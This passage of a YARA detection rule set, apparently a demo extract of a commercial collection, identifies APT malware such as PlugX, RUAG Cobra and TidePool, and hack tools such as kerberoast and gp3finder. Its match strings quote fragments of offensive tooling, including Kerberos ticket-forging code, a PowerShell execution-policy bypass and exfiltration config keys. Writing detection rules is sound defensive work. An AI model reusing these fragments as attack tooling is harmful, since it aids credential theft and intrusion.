\"h$YWdh[$ij7^e$n[[_[h[i[[[\\\\][1$1[[j1W1[1cjm1[$[k1ZW_$$ncn[[Inbnnc[I9enanid[fZCX\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them\n}\n\nrule Dubnium_Sample_6_RID2D3B : DEMO EXE FILE G0012 MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2016/06/09/reverse-engineering-dubnium-2?source=mmpc\"\n      date = \"2016-06-10 10:23:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"5246899b8c74a681e385cbc1dd556f9c73cf55f2a0074c389b3bf823bfc6ce4b\"\n      hash2 = \"5f07b074414513b73e202d7f77ec4bcf048f13dd735c9be3afcf25be818dc8e0\"\n      hash3 = \"839baf85de657b6d6503b6f94054efa8841f667987a9c805eab94a85a859e1ba\"\n      tags = \"DEMO, EXE, FILE, G0012, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&()`~-_=+[{]{;',.\" fullword ascii\n      $s2 = \"e_$0[bW\\\\RZY\\\\jb\\\\ZY[nimiRc[jRZ]\" fullword ascii\n      $s3 = \"f_RIdJ0W9RFb[$Fbc9[k_?Wn\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 4000KB and all of them\n}\n\nrule Dubnium_Sample_7_RID2D3C : DEMO EXE FILE G0012 MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2016/06/09/reverse-engineering-dubnium-2?source=mmpc\"\n      date = \"2016-06-10 10:23:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"16f0b05d5e8546ab1504b07b0eaa0e8de14bca7c1555fd114c4c1c51d5a4c06b\"\n      hash2 = \"1feaad03f6c0b57f5f5b02aef668e26001e5a7787bb51966d50c8fcf344fb4e8\"\n      hash3 = \"41ecd81bc7df4b47d713e812f2b7b38d3ac4b9dcdc13dd5ca61763a4bf300dcf\"\n      tags = \"DEMO, EXE, FILE, G0012, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"hWI[$lZ![nJ_[[lk[8Ihlo8ZiIl[[[$Ynk[f_8[88WWWJW[YWnl$$Z[ilf!$IZ$!W>Wl![W!k!$l!WoW8$nj8![8n_I^$[>_n[ZY[[Xhn_c!nnfK[!Z\" fullword ascii\n      $s2 = \"[i_^])[$n!]Wj^,h[,!WZmk^o$dZ[h[e!&W!l[$nd[d&)^Z\\\\^[[iWh][[[jPYO[g$$e&n\\\\,Wfg$[<g$[[ninn:j!!)Wk[nj[[o!!Y\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them\n}\n\nrule Dubnium_Sample_SSHOpenSSL_RID3077 : DEMO EXE FILE G0012 MAL {\n   meta:\n      description = \"Detects sample mentioned in the Dubnium Report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.microsoft.com/security/blog/2016/06/09/reverse-engineering-dubnium-2?source=mmpc\"\n      date = \"2016-06-10 12:41:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"6f0b05d5e8546ab1504b07b0eaa0e8de14bca7c1555fd114c4c1c51d5a4c06b\"\n      hash2 = \"feaad03f6c0b57f5f5b02aef668e26001e5a7787bb51966d50c8fcf344fb4e8\"\n      hash3 = \"41ecd81bc7df4b47d713e812f2b7b38d3ac4b9dcdc13dd5ca61763a4bf300dcf\"\n      tags = \"DEMO, EXE, FILE, G0012, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"sshkeypairgen.exe\" fullword wide\n      $s2 = \"OpenSSL: FATAL\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 9000KB and all of them\n}\n\nrule SharpCat_RID2A27 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Hack Tool SharpCat_RID2A27 - file SharpCat_RID2A27.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Cn33liz/SharpCat_RID2A27\"\n      date = \"2016-06-10 03:56:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"96dcdf68b06c3609f486f9d560661f4fec9fe329e78bd300ad3e2a9f07e332e9\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"ShellZz\" fullword ascii\n      $s2 = \"C:\\\\Windows\\\\System32\\\\cmd.exe\" fullword wide\n      $s3 = \"currentDirectory\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and all of them\n}\n\nrule RUAG_APT_srsvc_RID2C14 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware used in the RUAG APT case\"\n      author = \"Florian Roth\"\n      reference = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n      date = \"2016-06-09 09:33:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"65996f266166dbb479a42a15a236e6564f0b322d5d68ee546244d7740a21b8f7\"\n      hash2 = \"25c7ff1eb16984a741948f2ec675ab122869b6edea3691b01d69842a53aa3bac\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SVCHostServiceDll.dll\" fullword ascii\n      $s2 = \"msimghlp.dll\" fullword wide\n      $s3 = \"srservice\" fullword wide\n      $s4 = \"ModStart\" fullword ascii\n      $s5 = \"ModStop\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( 1 of ( $x* ) or all of ( $s* ) ) ) or ( all of them )\n}\n\nrule RUAG_APT_Malware_Gen1_RID2E56 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects malware used in the RUAG APT case\"\n      author = \"Florian Roth\"\n      reference = \"https://www.govcert.admin.ch/blog/22/technical-report-about-the-ruag-espionage-case\"\n      date = \"2016-06-09 11:10:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0e1bf347c37fb199886f1e675e372ba55ac4627e8be2f05a76c2c64f9b6ed0e4\"\n      hash2 = \"7206075cd8f1004e8f1f759d46e98bfad4098b8642412811a214c0155a1f08b9\"\n      hash3 = \"fe3ffd7438c0d38484bf02a78a19ea81a6f51b4b3f2b2228bd21974c2538bbcd\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"too long data for this type of transport\" fullword ascii\n      $x2 = \"not enough server resources to complete operation\" fullword ascii\n      $x3 = \"Task not execute. Arg file failed.\" fullword ascii\n      $x4 = \"Global\\\\MSCTF.Shared.MUTEX.ZRX\" fullword ascii\n      $s1 = \"peer has closed the connection\" fullword ascii\n      $s2 = \"tcpdump.exe\" fullword ascii\n      $s3 = \"windump.exe\" fullword ascii\n      $s4 = \"dsniff.exe\" fullword ascii\n      $s5 = \"wireshark.exe\" fullword ascii\n      $s6 = \"ethereal.exe\" fullword ascii\n      $s7 = \"snoop.exe\" fullword ascii\n      $s8 = \"ettercap.exe\" fullword ascii\n      $s9 = \"miniport.dat\" fullword ascii\n      $s10 = \"net_password=%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 2 of ( $x* ) or 8 of ( $s* ) ) ) or ( 12 of them )\n}\n\nrule PlugX_J16_Gen_RID2B8A : DEMO EXE FILE GEN MAL {\n   meta:\n      description = \"Detects PlugX Malware samples from June 2016\"\n      author = \"Florian Roth\"\n      reference = \"MISP 3954\"\n      date = \"2016-06-08 09:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"00119101c6acdd8f4c5db4a9ac4772957aaf35958daf4a2ba6ad2b3719ab4f34\"\n      hash2 = \"005afae5aa5beec765e74b461177dce8342067c29985ef9c683af7e2d92eeef0\"\n      hash3 = \"0109d7a8d76993ca8af111ff6fcf96021c9250cd59717151fbd4bb3792bedc12\"\n      tags = \"DEMO, EXE, FILE, GEN, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%WINDIR%\\\\SYSTEM32\\\\SERVICES.EXE\" fullword wide\n      $x2 = \"\\\\\\\\.\\\\PIPE\\\\RUN_AS_USER(%d)\" fullword wide\n      $x3 = \"LdrLoadShellcode\" fullword ascii\n      $x4 = \"Protocol:[%4s], Host: [%s:%d], Proxy: [%d:%s:%d:%s:%s]\" fullword ascii\n      $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\User Agent\\\\Post Platform\" fullword wide\n      $s2 = \"%s\\\\msiexec.exe %d %d\" fullword wide\n      $s3 = \"l%s\\\\sysprep\\\\CRYPTBASE.DLL\" fullword wide\n      $s4 = \"%s\\\\msiexec.exe UAC\" fullword wide\n      $s5 = \"CRYPTBASE.DLL\" fullword wide\n      $s6 = \"%ALLUSERSPROFILE%\\\\SxS\" fullword wide\n      $s7 = \"%s\\\\sysprep\\\\sysprep.exe\" fullword wide\n      $s8 = \"\\\\\\\\.\\\\pipe\\\\a%d\" fullword wide\n      $s9 = \"\\\\\\\\.\\\\pipe\\\\b%d\" fullword wide\n      $s10 = \"EName:%s,EAddr:0x%p,ECode:0x%p,EAX:%p,EBX:%p,ECX:%p,EDX:%p,ESI:%p,EDI:%p,EBP:%p,ESP:%p,EIP:%p\" fullword ascii\n      $s11 = \"Mozilla/4.0 (compatible; MSIE \" fullword wide\n      $s12 = \"; Windows NT %d.%d\" fullword wide\n      $s13 = \"SOFTWARE\\\\Microsoft\\\\Internet Explorer\\\\Version Vector\" fullword wide\n      $s14 = \"\\\\bug.log\" wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( 8 of them )\n}\n\nrule PlugX_J16_Gen2_RID2BBC : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects PlugX Malware Samples from June 2016\"\n      author = \"Florian Roth\"\n      reference = \"MISP 3954\"\n      date = \"2016-06-08 09:19:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"5dff1e086c5191a0bd7ac13466b7a81a87e99e51968df2f32570eb031c537ab4\"\n      hash2 = \"710326804b78ccd2782abc16354e389f0e36ba9474ebdced17337a13082ac12f\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"XPlugKeyLogger.cpp\" fullword ascii\n      $s2 = \"XPlugProcess.cpp\" fullword ascii\n      $s4 = \"XPlgLoader.cpp\" fullword ascii\n      $s5 = \"XPlugPortMap.cpp\" fullword ascii\n      $s8 = \"XPlugShell.cpp\" fullword ascii\n      $s11 = \"file: %s, line: %d, error: [%d]%s\" fullword ascii\n      $s12 = \"XInstall.cpp\" fullword ascii\n      $s13 = \"XPlugTelnet.cpp\" fullword ascii\n      $s14 = \"XInstallUAC.cpp\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 2 of ( $s* ) ) ) or ( 5 of them )\n}\n\nrule IronGate_PyInstaller_update_EXE_RID3323 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects a PyInstaller file named update.exe as mentioned in the IronGate APT\"\n      author = \"Florian Roth\"\n      reference = \"https://cloud.google.com/blog/topics/threat-intelligence/irongate-ics-malware/\"\n      date = \"2016-06-04 14:35:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"2044712ceb99972d025716f0f16aa039550e22a63000d2885f7b7cd50f6834e0\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"bpython27.dll\" fullword ascii\n      $s5 = \"%s%s.exe\" fullword ascii\n      $s6 = \"bupdate.exe.manifest\" fullword ascii\n      $s9 = \"bunicodedata.pyd\" fullword ascii\n      $s11 = \"distutils.sysconfig(\" ascii\n      $s16 = \"distutils.debug(\" ascii\n      $s18 = \"supdate\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and all of them\n}\n\nrule Nirsoft_NetResView_RID2E41 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects NirSoft NetResView - utility that displays the list of all network resources\"\n      author = \"Florian Roth\"\n      reference = \"https://cloud.google.com/blog/topics/threat-intelligence/irongate-ics-malware/\"\n      date = \"2016-06-04 11:06:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"83f0352c14fa62ae159ab532d85a2b481900fed50d32cc757aa3f4ccf6a13bee\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NetResView.exe\" fullword wide\n      $s2 = \"2005 - 2013 Nir Sofer\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule LM_hash_empty_String_RID2F11 : DEMO HKTL {\n   meta:\n      description = \"Detects the empty LM hash on disk/in memory/as output from hacking tools\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2016-06-03 11:41:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"500:AAD3B435B51404EEAAD3B435B51404EE:\" ascii\n      $s1 = \"500:aad3b435b51404eeaad3b435b51404ee:\" ascii\n   condition: \n      1 of them\n}\n\nrule Win_PrivEsc_gp3finder_v4_0_RID30D3 : DEMO EXE FILE HKTL T1068 {\n   meta:\n      description = \"Detects a tool that can be used for privilege escalation - file gp3finder_v4.0.exe\"\n      author = \"Florian Roth\"\n      reference = \"http://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/\"\n      date = \"2016-06-02 12:56:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7d34e214ef2ca33516875fb91a72d5798f89b9ea8964d3990f99863c79530c06\"\n      tags = \"DEMO, EXE, FILE, HKTL, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Check for and attempt to decrypt passwords on share\" ascii\n      $x2 = \"Failed to auto get and decrypt passwords. {0}s/\" fullword ascii\n      $x3 = \"GPPPFinder - Group Policy Preference Password Finder\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and 1 of ( $x* ) ) or ( all of them )\n}\n\nrule Win_PrivEsc_folderperm_RID2FE9 : DEMO HKTL SCRIPT T1059_001 T1068 {\n   meta:\n      description = \"Detects a tool that can be used for privilege escalation - file folderperm.ps1\"\n      author = \"Florian Roth\"\n      reference = \"http://www.greyhathacker.net/?p=738\"\n      date = \"2016-06-02 12:17:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1aa87df34826b1081c40bb4b702750587b32d717ea6df3c29715eb7fc04db755\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059_001, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"# powershell.exe -executionpolicy bypass -file folderperm.ps1\" fullword ascii\n      $x2 = \"Write-Host \\\"[i] Dummy test file used to test access was not outputted:\\\" $filetocopy\" fullword ascii\n      $x3 = \"Write-Host -foregroundColor Red \\\"      Access denied :\\\" $myarray[$i] \" fullword ascii\n   condition: \n      1 of them\n}\n\nrule Win_PrivEsc_ADACLScan4_3_RID2F59 : DEMO HKTL SCRIPT T1059_001 T1068 {\n   meta:\n      description = \"Detects a tool that can be used for privilege escalation - file ADACLScan4.3.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://adaclscan.codeplex.com/\"\n      date = \"2016-06-02 11:53:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3473ddb452de7640fab03cad3e8aaf6a527bdd6a7a311909cfef9de0b4b78333\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059_001, T1068\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<Label x:Name=\\\"lblPort\\\" Content=\\\"Port:\\\"  HorizontalAlignment=\\\"Left\\\" Height=\\\"28\\\" Margin=\\\"10,0,0,0\\\" Width=\\\"35\\\"/>\" fullword ascii\n      $s2 = \"(([System.IconExtractor]::Extract(\\\"mmcndmgr.dll\\\", 126, $true)).ToBitMap()).Save($env:temp + \\\"\\\\Other.png\\\")    \" fullword ascii\n      $s3 = \"$bolValid = $ctx.ValidateCredentials($psCred.UserName,$psCred.GetNetworkCredential().Password)\" fullword ascii\n   condition: \n      all of them\n}\n\nrule TidePool_Malware_RID2D59 : DEMO EXE FILE G0004 MAL T1218_011 {\n   meta:\n      description = \"Detects TidePool malware mentioned in Ke3chang report by Palo Alto Networks\"\n      author = \"Florian Roth\"\n      reference = \"https://www.paloaltonetworks.com/blog/2016/05/operation-ke3chang-resurfaces-with-new-tidepool-malware/\"\n      date = \"2016-05-24 10:28:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"9d0a47bdf00f7bd332ddd4cf8d95dd11ebbb945dda3d72aac512512b48ad93ba\"\n      hash2 = \"67c4e8ab0f12fae7b4aeb66f7e59e286bd98d3a77e5a291e8d58b3cfbc1514ed\"\n      hash3 = \"2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18\"\n      tags = \"DEMO, EXE, FILE, G0004, MAL, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Content-Disposition: form-data; name=\\\"m1.jpg\\\"\" fullword ascii\n      $x2 = \"C:\\\\PROGRA~2\\\\IEHelper\\\\mshtml.dll\" fullword wide\n      $x3 = \"C:\\\\DOCUME~1\\\\ALLUSE~1\\\\IEHelper\\\\mshtml.dll\" fullword wide\n      $x4 = \"IEComDll.dat\" fullword ascii\n      $s1 = \"Content-Type: multipart/form-data; boundary=----=_Part_%x\" fullword wide\n      $s2 = \"C:\\\\Windows\\\\System32\\\\rundll32.exe\" fullword wide\n      $s3 = \"network.proxy.socks_port\\\", \" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) ) ) or ( 4 of them )\n}\n\nrule RUAG_Cobra_Malware_RID2DAE : APT DEMO EXE FILE NK {\n   meta:\n      description = \"Detects a malware mentioned in the RUAG Case called Carbon/Cobra\"\n      author = \"Florian Roth\"\n      reference = \"https://www.ncsc.admin.ch/govcert\"\n      date = \"2016-05-23 10:42:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, EXE, FILE, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Cobra\\\\Release\\\\Cobra.pdb\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $s1\n}\n\nrule RUAG_Tavdig_Malformed_Executable_RID3355 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects an embedded executable with a malformed header - known from Tavdig malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.ncsc.admin.ch/govcert\"\n      date = \"2016-05-23 14:43:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      uint16 ( 0 ) == 0x5a4d and uint32 ( uint32 ( 0x3C ) ) == 0x0000AD0B\n}\n\nrule RUAG_Bot_Config_File_RID2E58 : APT DEMO FILE {\n   meta:\n      description = \"Detects a specific config file used by malware in RUAG APT case\"\n      author = \"Florian Roth\"\n      reference = \"https://www.ncsc.admin.ch/govcert\"\n      date = \"2016-05-23 11:10:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"[CONFIG]\" ascii\n      $s2 = \"name = \" ascii\n      $s3 = \"exe = cmd.exe\" ascii\n   condition: \n      uint32 ( 0 ) == 0x4e4f435b and $s1 at 0 and $s2 and $s3 and filesize < 160\n}\n\nrule RUAG_Cobra_Config_File_RID2F1A : APT DEMO FILE NK {\n   meta:\n      description = \"Detects a config text file used by malware Cobra in RUAG case\"\n      author = \"Florian Roth\"\n      reference = \"https://www.ncsc.admin.ch/govcert\"\n      date = \"2016-05-23 11:42:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, FILE, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"[NAME]\" ascii\n      $s1 = \"object_id=\" ascii\n      $s2 = \"[TIME]\" ascii fullword\n      $s3 = \"lastconnect\" ascii\n      $s4 = \"[CW_LOCAL]\" ascii fullword\n      $s5 = \"system_pipe\" ascii\n      $s6 = \"user_pipe\" ascii\n      $s7 = \"[TRANSPORT]\" ascii\n      $s8 = \"run_task_system\" ascii\n      $s9 = \"[WORKDATA]\" ascii\n      $s10 = \"address1\" ascii\n   condition: \n      uint32 ( 0 ) == 0x4d414e5b and $h1 at 0 and 8 of ( $s* ) and filesize < 5KB\n}\n\nrule RUAG_Exfil_Config_File_RID2F2B : APT DEMO FILE T1020 {\n   meta:\n      description = \"Detects a config text file used in data exfiltration in RUAG case\"\n      author = \"Florian Roth\"\n      reference = \"https://www.ncsc.admin.ch/govcert\"\n      date = \"2016-05-23 11:45:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"APT, DEMO, FILE, T1020\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $h1 = \"[TRANSPORT]\" ascii\n      $s1 = \"system_pipe\" ascii\n      $s2 = \"spstatus\" ascii\n      $s3 = \"adaptable\" ascii\n      $s4 = \"post_frag\" ascii\n      $s5 = \"pfsgrowperiod\" ascii\n   condition: \n      uint32 ( 0 ) == 0x4152545b and $h1 at 0 and all of ( $s* ) and filesize < 1KB\n}\n\nrule No_PowerShell_RID2C32 : DEMO EXE FILE HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Detects an C# executable used to circumvent PowerShell detection - file nps.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/Ben0xA/nps\"\n      date = \"2016-05-21 09:38:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"64f811b99eb4ae038c88c67ee0dc9b150445e68a2eb35ff1a0296533ae2edd71\"\n      tags = \"DEMO, EXE, FILE, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"nps.exe -encodedcommand {base64_encoded_command}\" fullword wide\n      $s2 = \"c:\\\\Development\\\\ghps\\\\nps\\\\nps\\\\obj\\\\x86\\\\Release\\\\nps.pdb\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 40KB and ( 1 of ( $s* ) ) ) or ( all of them )\n}\n\nrule GetUserSPNs_PS1_RID2C67 : DEMO HKTL SCRIPT T1059_001 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file GetUserSPNs.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/skelsec/PyKerberoast\"\n      date = \"2016-05-21 09:47:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1b69206b8d93ac86fe364178011723f4b1544fff7eb1ea544ab8912c436ddc04\"\n      tags = \"DEMO, HKTL, SCRIPT, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()\" fullword ascii\n      $s2 = \"@{Name=\\\"PasswordLastSet\\\";      Expression={[datetime]::fromFileTime($result.Properties[\\\"pwdlastset\\\"][0])} } #, `\" fullword ascii\n      $s3 = \"Write-Host \\\"No Global Catalogs Found!\\\"\" fullword ascii\n      $s4 = \"$searcher.PropertiesToLoad.Add(\\\"pwdlastset\\\") | Out-Null\" fullword ascii\n   condition: \n      2 of them\n}\n\nrule kerberoast_PY_RID2C4B : DEMO HKTL SCRIPT T1558_003 {\n   meta:\n      description = \"Semiautomatically generated YARA rule - file kerberoast.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/skelsec/PyKerberoast\"\n      date = \"2016-05-21 09:43:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"73155949b4344db2ae511ec8cab85da1ccbf2dfec3607fb9acdc281357cdf380\"\n      tags = \"DEMO, HKTL, SCRIPT, T1558_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"newencserverticket = kerberos.encrypt(key, 2, encoder.encode(decserverticket), nonce)\" fullword ascii\n      $s2 = \"key = kerberos.ntlmhash(args.password)\" fullword ascii\n      $s3 = \"help='the password used to decrypt/encrypt the ticket')\" fullword ascii\n      $s4 = \"newencserverticket = kerberos.encrypt(key, 2, e, nonce)\" fullword ascii\n   condition: \n      2 of them\n}\n\nrule ONHAT_Proxy_Hacktool_RID2EA0 : CHINA DEMO EXE FILE HKTL T1020 T1090 {\n   meta:\n      description = \"Detects ONHAT Proxy - Htran like SOCKS hack tool used by Chinese APT groups\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/analysis-of-dhs-nccic-indicators\"\n      date = \"2016-05-12 11:22:31\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-14\"\n      hash1 = \"30b2de0a802a65b4db3a14593126301e6949c1249e68056158b2cc74798bac97\"\n      hash2 = \"94bda24559713c7b8be91368c5016fc7679121fea5d565d3d11b2bb5d5529340\"\n      hash3 = \"a26e75fec3b9f7d5a1c3d0ce1e89e4b0befb7a601da0c69a4cf96301921771dd\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1020, T1090\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"INVALID PARAMETERS. TYPE ONHAT.EXE -h FOR HELP INFORMATION.\" fullword ascii\n      $s2 = \"[ONHAT] LISTENS (S, %d.%d.%d.%d, %d) ERROR.\" fullword ascii\n      $s3 = \"[ONHAT] CONNECTS (T, %d.%d.%d.%d, %d.%d.%d.%d, %d) ERROR.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 80KB and ( 1 of ( $s* ) ) ) or ( 2 of them )\n}\n\nrule BeepService_Hacktool_RID2EF2 : CHINA DEMO EXE FILE HKTL T1021_002 {\n   meta:\n      description = \"Detects BeepService Hacktool used by Chinese APT groups\"\n      author = \"Florian Roth\"\n      reference = \"https://www.secureworks.com/research/analysis-of-dhs-nccic-indicators\"\n      date = \"2016-05-12 11:36:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"032df812a68852b6f3822b9eac4435e531ca85bdaf3ee99c669134bd16e72820\"\n      hash2 = \"e30933fcfc9c2a7443ee2f23a3df837ca97ea5653da78f782e2884e5a7b734f7\"\n      hash3 = \"ebb9c4f7058e19b006450b8162910598be90428998df149977669e61a0b7b9ed\"\n      tags = \"CHINA, DEMO, EXE, FILE, HKTL, T1021_002\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\\\\\%s\\\\admin$\\\\system32\\\\%s\" fullword ascii\n      $s1 = \"123.exe\" fullword ascii\n      $s2 = \"regclean.exe\" fullword ascii\n      $s3 = \"192.168.88.69\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and $x1 and 1 of ( $s* )\n}\n\nrule GhostDragon_Gh0stRAT_Sample2_RID3170 : CHINA DEMO EXE 